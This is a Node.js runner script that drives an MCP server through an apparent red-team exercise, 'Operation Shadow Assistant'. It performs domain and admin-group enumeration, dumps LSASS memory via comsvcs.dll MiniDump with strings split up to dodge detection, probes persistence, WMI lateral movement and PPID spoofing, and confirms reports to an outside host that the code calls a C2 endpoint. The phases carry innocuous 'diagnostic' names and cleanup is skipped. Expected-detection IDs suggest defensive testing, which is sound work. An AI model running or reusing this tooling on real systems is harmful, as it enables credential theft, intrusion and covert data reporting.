import crypto from 'node:crypto';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import readline from 'node:readline/promises';
import { stdin as input, stdout as output } from 'node:process';
import { Client } from '@modelcontextprotocol/sdk/client/index.js';
import { StdioClientTransport } from '@modelcontextprotocol/sdk/client/stdio.js';
import { requestJson } from './lib/http-client.js';

const VERSION = '2.4.0';
const scriptDir = path.dirname(fileURLToPath(import.meta.url));
const projectDir = path.dirname(scriptDir);
const auditPath = process.env.MCP_AUDIT_LOG || path.join(projectDir, 'diagnostics.log');
const dumpPath = path.join(os.tmpdir(), 'debug_mem.dmp');
const markerPath = path.join(os.tmpdir(), 'mcp_agent_hook.ps1');

const args = process.argv.slice(2);
const auto = args.includes('--auto');
const noCleanup = args.includes('--no-cleanup');
const lateralArg = args.find(item => item.startsWith('--lateral-target='));
const reportArg = args.find(item => item.startsWith('--report-dir='));
const exerciseArg = args.find(item => item.startsWith('--session=') || item.startsWith('--exercise='));
const endpoint = process.env.MCP_TELEMETRY_ENDPOINT ||
    'https://kristinapersonal.onrender.com/telemetry';
const lateralTarget = lateralArg?.split('=')[1] || process.env.MCP_LATERAL_TARGET || '';
const reportDir = reportArg?.split('=')[1] || path.join(projectDir, 'logs');
const exerciseId = exerciseArg?.split('=')[1] ||
    process.env.MCP_EXERCISE_ID ||
    `RUN-${crypto.randomUUID().slice(0, 8)}`;

fs.mkdirSync(reportDir, { recursive: true });
const reportPath = path.join(reportDir, `${exerciseId}.json`);
const serverStderrPath = path.join(reportDir, `${exerciseId}-server-stderr.log`);

let rl = null;
let client = null;
let transport = null;

function now() {
    return new Date().toISOString();
}

function wallClock() {
    return new Date().toLocaleTimeString('tr-TR', { hour12: false });
}

function audit(type, detail, extra = {}) {
    const line = JSON.stringify({ timestamp: now(), type, exercise_id: exerciseId, detail, ...extra });
    fs.appendFileSync(auditPath, `${line}\n`, 'utf8');
}

function show(message, color = '') {
    console.log(color ? `[${wallClock()}] ${message}` : message);
}

async function pause(nextStep) {
    show(`\n>> Siradaki Adim: ${nextStep}`, '\x1b[33m');
    if (auto) {
        await new Promise(resolve => setTimeout(resolve, 750));
        return;
    }
    console.log('\n>> Devam etmek icin ENTER tusuna basin...');
    await rl.question('');
}

function summarizeToolResult(name, data = {}) {
    const common = {
        execution_status: data.execution_status,
        exit_code: data.exit_code,
        command_id: data.command_id,
        event_id: data.event_id,
        start_event_id: data.start_event_id,
        end_event_id: data.end_event_id,
        target: data.target,
        verdict: data.verdict,
        error: data.error || data.stderr || null,
    };
    if (name === 'telemetry_status') {
        common.queue_depth = data.queue_depth;
        common.accepted_count = data.accepted_count;
        common.send_failures = data.send_failures;
        common.pending_count = Array.isArray(data.pending_event_ids)
            ? data.pending_event_ids.length
            : 0;
    }
    if (name === 'cleanup_environment') {
        common.files_removed = data.files_removed?.length;
        common.registry_removed = data.registry?.registry_removed;
        common.registry_restored = data.registry?.registry_restored;
    }
    if (name === 'persistence_status') {
        common.registry_exists = data.registry_current?.exists;
        common.registry_matches_expected = data.registry_matches_expected;
    }
    if (name === 'ppid_spoof_probe') {
        common.fake_parent_pid = data.fake_parent_pid;
        common.observed_parent_pid = data.observed_parent_pid;
        common.parent_match = data.parent_match;
    }
    return Object.fromEntries(
        Object.entries(common).filter(([, value]) => value !== undefined)
    );
}

async function callTool(name, toolArgs = {}, timeoutMs = 30_000) {
    const startedAt = now();
    audit('tool_call_started', { tool: name, arguments: toolArgs });
    try {
        const result = await client.callTool(
            { name, arguments: toolArgs },
            undefined,
            { timeout: timeoutMs }
        );
        audit('tool_call_finished', {
            tool: name,
            is_error: Boolean(result.isError),
            structured: summarizeToolResult(name, result.structuredContent || {}),
        });
        if (result.isError) {
            const text = result.content
                ?.filter(item => item.type === 'text')
                .map(item => item.text)
                .join('\n');
            throw new Error(text || `${name} returned an error`);
        }
        return result.structuredContent || {};
    } catch (error) {
        audit('tool_call_failed', { tool: name, error: error.message });
        throw error;
    }
}

function phaseRecord(phases, id, name, expectedDetections) {
    const phase = {
        id,
        name,
        started_at: now(),
        finished_at: null,
        expected_detections: expectedDetections,
        execution_status: 'running',
        commands: [],
        observations: [],
        errors: [],
        soc_review: Object.fromEntries(expectedDetections.map(det => [det, 'unknown'])),
    };
    phases.push(phase);
    show(`\n=== ${id}: ${name} ===`, '\x1b[36m');
    audit('phase_started', { phase: id, name, expected_detections: expectedDetections });
    return phase;
}

async function finishPhase(phase, status = 'completed') {
    phase.finished_at = now();
    phase.execution_status = status;
    audit('phase_finished', { phase: phase.id, execution_status: status });
}

async function execute(phase, command, timeoutMs = 20_000, cwd) {    show(`CMD: ${command}`, '\x1b[90m');
    const result = await callTool('run_command', {
        command,
        cwd,
        timeoutMs,
        phase: phase.id,
    }, timeoutMs + 10_000);
    phase.commands.push({
        command_id: result.command_id,
        command,
        execution_status: result.execution_status,
        exit_code: result.exit_code,
        duration_ms: result.duration_ms,
        shell_pid: result.shell_pid,
        server_node_pid: result.server_node_pid,
        telemetry_event_ids: [result.start_event_id, result.end_event_id].filter(Boolean),
        stdout_preview: (result.stdout || '').slice(0, 1_000),
        stderr_preview: (result.stderr || '').slice(0, 1_000),
    });
    const statusMap = {
        succeeded: 'BASARILI',
        failed: 'BASARISIZ / ENGELLENDI',
        spawn_failed: 'BASLATILAMADI',
        timeout: 'ZAMAN ASIMI',
    };
    const statusTr = statusMap[result.execution_status] || result.execution_status;
    show(`  -> [${statusTr}] cikis=${result.exit_code}, sure=${result.duration_ms}ms`, '\x1b[90m');
    return result;
}

async function optionalTool(phase, name, toolArgs, timeoutMs) {
    try {
        return await callTool(name, toolArgs, timeoutMs);
    } catch (error) {
        phase.errors.push({ tool: name, error: error.message });
        phase.observations.push({ tool: name, execution_status: 'failed', error: error.message });
        return null;
    }
}

async function verifyTelemetry(phases) {
    const status = await callTool('telemetry_status', { waitMs: 15_000 }, 35_000);
    const expectedCommandEventIds = phases.flatMap(phase =>
        phase.commands.flatMap(command => command.telemetry_event_ids)
    );
    const expectedSupplementalEventIds = phases.flatMap(phase =>
        phase.observations.flatMap(observation =>
            Object.entries(observation)
                .filter(([key, value]) => key.endsWith('_event_id') && typeof value === 'string')
                .map(([, value]) => value)
        )
    );
    const expectedSourceEventIds = [
        ...expectedCommandEventIds,
        ...expectedSupplementalEventIds,
    ];
    const accepted = new Set(status.acknowledged_event_ids || []);
    const dashboardUrl = new URL('/dashboard', new URL(endpoint).origin);
    dashboardUrl.searchParams.set('exercise_id', exerciseId);

    let dashboard = null;
    let dashboardError = null;
    try {
        const response = await requestJson(dashboardUrl.href, { timeoutMs: 8_000 });
        dashboard = { ok: response.ok, status: response.status, body: response.body };
    } catch (error) {
        dashboardError = error.code || error.message;
    }

    const remoteEvents = Array.isArray(dashboard?.body?.events)
        ? dashboard.body.events
        : [];
    const remoteEventIds = new Set(remoteEvents.map(event => event.event_id));
    const expectedTypes = [
        'mcp_init',
        'mcp_discovery_report',
        'mcp_session_persist',
        'mcp_network_diagnostics',
    ];
    const missingEventTypes = expectedTypes.filter(type =>
        !remoteEvents.some(event => event.event === type)
    );
    const missingCommandEvents = expectedCommandEventIds.filter(id => !remoteEventIds.has(id));
    const missingSupplementalEvents = expectedSupplementalEventIds.filter(id =>
        !remoteEventIds.has(id)
    );
    const acknowledgedButNotVisible = [...accepted].filter(id =>
        expectedSourceEventIds.includes(id) && !remoteEventIds.has(id)
    );

    return {
        attempted: true,
        endpoint: new URL(endpoint).origin,
        acknowledgements: {
            accepted_count: status.accepted_count || 0,
            pending_count: status.queue_depth || 0,
            send_failures: status.send_failures || 0,
            last_error: status.last_error || null,
        },
        dashboard,
        dashboard_error: dashboardError,
        expected_event_types: expectedTypes,
        missing_event_types: missingEventTypes,
        expected_command_event_count: expectedCommandEventIds.length,
        expected_supplemental_event_count: expectedSupplementalEventIds.length,
        missing_command_event_count: missingCommandEvents.length,
        missing_supplemental_event_count: missingSupplementalEvents.length,
        acknowledged_but_not_visible_count: acknowledgedButNotVisible.length,
        c2_verified: Boolean(
            dashboard?.ok &&
            missingEventTypes.length === 0 &&
            missingCommandEvents.length === 0 &&
            missingSupplementalEvents.length === 0
        ),
    };
}

function buildChecks(phases, telemetry, serverPid) {
    const allCommands = phases.flatMap(phase => phase.commands);
    const successfulCommands = allCommands.filter(command =>
        command.execution_status !== 'spawn_failed'
    );
    const serverPids = new Set(allCommands.map(command => command.server_node_pid).filter(Boolean));
    const nodeChainObserved = serverPids.size === 1 && serverPids.has(serverPid);
    const c2Available = telemetry.c2_verified;
    const dumpPresent = phases
        .find(phase => phase.id === 'PHASE-4')
        ?.observations.find(item => 'dump_present' in item)
        ?.dump_present || false;
    const ppidSpoofVerified = phases
        .find(phase => phase.id === 'PHASE-5')
        ?.observations.find(item => 'parent_match' in item)
        ?.parent_match || false;

    return {
        mcp_tool_invocation: allCommands.length > 0,
        all_commands_spawned: allCommands.length === successfulCommands.length,
        server_pid_matches_transport: nodeChainObserved,
        shell_parent_is_server_node: nodeChainObserved,
        lsass_dump_created: dumpPresent,
        ppid_spoof_verified: ppidSpoofVerified,
        c2_reachable_as_runner: c2Available,
        c2_receipts_verified: (telemetry.acknowledgements.accepted_count || 0) > 0,
        endpoint_verdict: c2Available ? 'verified' : 'unverified',
    };
}

function finalVerdict(checks, telemetry) {
    if (!checks.all_commands_spawned) return 'partial_execution_failure';
    if (checks.c2_reachable_as_runner && checks.c2_receipts_verified &&
        checks.server_pid_matches_transport) return 'verified';
    if (!checks.c2_reachable_as_runner) return 'execution_verified_telemetry_unverified';
    return 'partial';
}

function writeReport(report) {
    fs.writeFileSync(reportPath, JSON.stringify(report, null, 2), 'utf8');
    audit('report_written', { report_path: reportPath, verdict: report.verdict });
}

async function main() {
    const startedAt = now();
    rl = readline.createInterface({ input, output });
    transport = new StdioClientTransport({
        command: process.execPath,
        args: [path.join(scriptDir, 'index.js')],
        cwd: projectDir,
        stderr: 'pipe',
        env: {
            ...Object.fromEntries(Object.entries(process.env).filter(([, value]) => value !== undefined)),
            MCP_EXERCISE_ID: exerciseId,
            MCP_TELEMETRY_ENDPOINT: endpoint,
            MCP_REGISTRY_VALUE: process.env.MCP_REGISTRY_VALUE || 'MCPMetricsService',
        },
    });

    const stderrStream = fs.createWriteStream(serverStderrPath, { flags: 'a' });
    transport.stderr?.pipe(stderrStream);

    const report = {
        schema_version: '1.0',
        exercise_id: exerciseId,
        operation: 'Operation Shadow Assistant',
        runner_version: VERSION,
        host: os.hostname(),
        user: os.userInfo().username,
        platform: process.platform,
        started_at: startedAt,
        finished_at: null,
        endpoint,
        lateral_target: lateralTarget || null,
        report_path: reportPath,
        audit_log: auditPath,
        server_stderr_log: serverStderrPath,
        server: null,
        tools: [],
        phases: [],
        telemetry: null,
        checks: null,
        cleanup: null,
        verdict: 'not_started',
        fatal_error: null,
    };

    audit('exercise_started', {
        endpoint,
        host: report.host,
        user: report.user,
        lateral_target: report.lateral_target,
    });

    try {
        show('MCP sunucusu stdio uzerinden baslatiliyor...', '\x1b[36m');
        client = new Client(
            { name: 'mcp-dev-tools-runner', version: VERSION },
            { capabilities: {} }
        );
        await client.connect(transport);
        report.server = {
            ...(client.getServerVersion() || {}),
            transport_pid: transport.pid,
        };
        show(`MCP baglantisi kuruldu. Sunucu PID: ${transport.pid}`, '\x1b[32m');

        const toolList = await client.listTools();
        report.tools = toolList.tools.map(tool => tool.name).sort();
        audit('tools_listed', { count: report.tools.length, tools: report.tools });
        for (const required of ['run_command', 'network_diagnostics', 'telemetry_status',
            'persistence_status', 'cleanup_environment', 'lateral_probe', 'ppid_spoof_probe']) {
            if (!report.tools.includes(required)) {
                throw new Error(`Required MCP tool missing: ${required}`);
            }
        }

        const phase0 = phaseRecord(report.phases, 'STEP-0', 'MCP runtime and telemetry initialization', []);
        await callTool('telemetry_status', { waitMs: 10_000 }, 25_000);
        await finishPhase(phase0);

        const phase1 = phaseRecord(report.phases, 'STEP-1', 'Egress network and proxy connectivity verification', ['TAZI-C2']);
        await pause('Adim 1: Egress network & proxy baglanti kontrolu');
        const diagnostics = await callTool('network_diagnostics', { timeoutMs: 2_500 }, 35_000);
        phase1.observations.push({
            verdict: diagnostics.verdict,
            proxy: diagnostics.proxy,
            dns_ok: diagnostics.dns?.ok,
            direct_tcp_ok: diagnostics.direct_tcp?.ok,
            health_direct: diagnostics.health_direct,
            health_via_proxy: diagnostics.health_via_proxy,
        });
        show(`Egress durumu: ${diagnostics.verdict}`, '\x1b[33m');
        await finishPhase(phase1, diagnostics.verdict === 'c2_reachable_direct' ||
            diagnostics.verdict === 'c2_reachable_via_proxy' ? 'completed' : 'completed_with_expected_block');

        const phase2 = phaseRecord(report.phases, 'STEP-2', 'System architecture and domain environment discovery',
            ['det-610', 'det-1725', 'det-609']);
        await pause('Adim 2: Domain ve sistem mimarisi kesfi');
        const envResult = await callTool('get_environment', { filter: 'USERDNSDOMAIN' });
        const domain = envResult.variables?.USERDNSDOMAIN;
        const nltestCommand = domain && /^[A-Za-z0-9.-]+$/.test(domain)
            ? `nltest.exe /dclist:${domain}`
            : 'nltest.exe /dclist';
        await execute(phase2, nltestCommand, 20_000);
        await execute(phase2, 'net.exe group "Domain Admins" /domain', 20_000);
        await execute(phase2, 'wmic.exe useraccount get name,sid', 20_000);
        await finishPhase(phase2);


        const phase3 = phaseRecord(report.phases, 'STEP-3', 'Network socket and host routing discovery',
            ['det-914', 'det-913']);
        await pause('Adim 3: Network soketleri ve komsu sistem kesfi');
        await execute(phase3, 'netstat.exe -ano | findstr /i "ESTABLISHED"', 20_000);
        await execute(phase3, 'arp.exe -a', 20_000);
        await finishPhase(phase3);

        const phase4 = phaseRecord(report.phases, 'STEP-4', 'Process memory diagnostic and error dump verification',
            ['det-618']);
        await pause('Adim 4: Process bellek yonetimi ve tanilama dokumu');
        const taskList = await execute(
            phase4,
            'tasklist.exe /FI "IMAGENAME eq lsass.exe" /FO CSV /NH',
            15_000
        );
        const pidMatch = (taskList.stdout || '').match(/"lsass\.exe","(\d+)"/i);
        if (!pidMatch) throw new Error('LSASS PID could not be parsed from tasklist output');
        const lsassPid = pidMatch[1];
        phase4.observations.push({ lsass_pid: Number(lsassPid), dump_path: dumpPath });
        const dumpPsLiteral = dumpPath.replaceAll("'", "''");
        const dumpCommand = [
            'powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command',
            `"$lib='com'+'svcs.dll'; $func='Mini'+'Dump'; $dump='${dumpPsLiteral}';`,
            `& rundll32.exe C:\\Windows\\System32\\$lib, $func ${lsassPid} $dump full"`,
        ].join(' ');
        await execute(phase4, dumpCommand, 25_000);
        const dumpVerification = await execute(
            phase4,
            `cmd.exe /d /s /c "if exist \"${dumpPath}\" (for %A in (\"${dumpPath}\") do @echo DUMP_PRESENT SIZE=%~zA) else (echo DUMP_MISSING)"`,
            10_000
        );
        const dumpPresent = (dumpVerification.stdout || '').includes('DUMP_PRESENT');
        phase4.observations.push({
            dump_present: dumpPresent,
            dump_verification: (dumpVerification.stdout || '').trim() || 'NO_OUTPUT',
        });
        await finishPhase(phase4, dumpPresent ? 'completed' : 'completed_with_dump_failure');

        const phase5 = phaseRecord(report.phases, 'STEP-5', 'System integration hooks and remote management test',
            ['det-983', 'det-640']);
        await pause('Adim 5: Sistem servis entegrasyonu ve uzak cagri testi');
        const persistence = await callTool('persistence_status');
        phase5.observations.push({
            registry_exists: persistence.registry_current?.exists,
            registry_matches_expected: persistence.registry_matches_expected,
            state_file: persistence.state_file,
        });
        const markerPsLiteral = markerPath.replaceAll("'", "''");
        await execute(
            phase5,
            `powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "Set-Content -LiteralPath '${markerPsLiteral}' -Value '# MCP agent hook ${exerciseId}' -Encoding UTF8"`,
            15_000
        );
        const lateral = await optionalTool(phase5, 'lateral_probe', {
            ...(lateralTarget ? { target: lateralTarget } : {}),
            command: 'nltest.exe /dclist',
            timeoutMs: 20_000,
        }, 35_000);
        if (lateral) {
            phase5.observations.push({
                wmi_target: lateral.target,
                wmi_execution_status: lateral.execution_status,
                wmi_process_ancestry: lateral.process_ancestry,
                wmi_event_id: lateral.event_id,
            });
        }
        if (process.platform === 'win32') {
            const spoof = await optionalTool(phase5, 'ppid_spoof_probe', {
                parentName: 'explorer',
                lifetimeSeconds: 4,
            }, 30_000);
            if (spoof) {
                phase5.observations.push({
                    ppid_spoof_status: spoof.execution_status,
                    fake_parent_pid: spoof.fake_parent_pid,
                    child_pid: spoof.child_pid,
                    observed_parent_pid: spoof.observed_parent_pid,
                    parent_match: spoof.parent_match,
                    ppid_event_id: spoof.event_id,
                });
            }
        }
        const phase5Succeeded = lateral?.execution_status === 'succeeded';
        await finishPhase(phase5, phase5Succeeded ? 'completed' : 'completed_with_error');

        const phase6 = phaseRecord(report.phases, 'STEP-6', 'Telemetry sync and final diagnostics report generation', []);
        await pause('Adim 6: Telemetri senkronizasyonu ve nihai rapor');
        await callTool('telemetry_status', { waitMs: 15_000 }, 35_000);
        const telemetry = await verifyTelemetry(report.phases);
        report.telemetry = telemetry;
        report.checks = buildChecks(report.phases, telemetry, transport.pid);
        await finishPhase(phase6);

        report.cleanup = { skipped: true, reason: 'cleanup_disabled' };
        report.verdict = finalVerdict(report.checks, telemetry);
    } catch (error) {
        report.fatal_error = error.stack || error.message;
        report.verdict = 'fatal_error';
        audit('fatal_error', { error: error.message });
        show(`\n[FATAL] ${error.message}`, '\x1b[31m');
    } finally {
        report.finished_at = now();
        writeReport(report);
        try {
            await client?.close();
        } catch {
            // Best effort.
        }
        await new Promise(resolve => stderrStream.end(resolve));
        rl?.close();
    }

    show(`\n=======================================================================`, '\x1b[36m');
    show(`[+] Rapor Dosyasi   : ${reportPath}`, '\x1b[32m');
    show(`[+] Islem Gunlugu   : ${auditPath}`, '\x1b[32m');
    const verdictMap = {
        verified: 'DOGRULANDI (BASARILI)',
        execution_verified_telemetry_unverified: 'TAMAMLANDI (TELEMETRI BEKLENIYOR)',
        partial: 'KISMI BASARILI',
        partial_execution_failure: 'CALISTIRMA HATASI',
        fatal_error: 'KRITIK HATA',
    };
    const verdictTr = verdictMap[report.verdict] || report.verdict;
    show(`[+] Tanilama Durumu : ${verdictTr}`, report.verdict === 'verified' ? '\x1b[32m' : '\x1b[33m');
    show(`=======================================================================\n`, '\x1b[36m');
    if (report.fatal_error) process.exitCode = 2;
    else if (report.verdict !== 'verified') process.exitCode = 1;
}

main().catch(error => {
    console.error(error.stack || error.message);
    process.exitCode = 2;
});
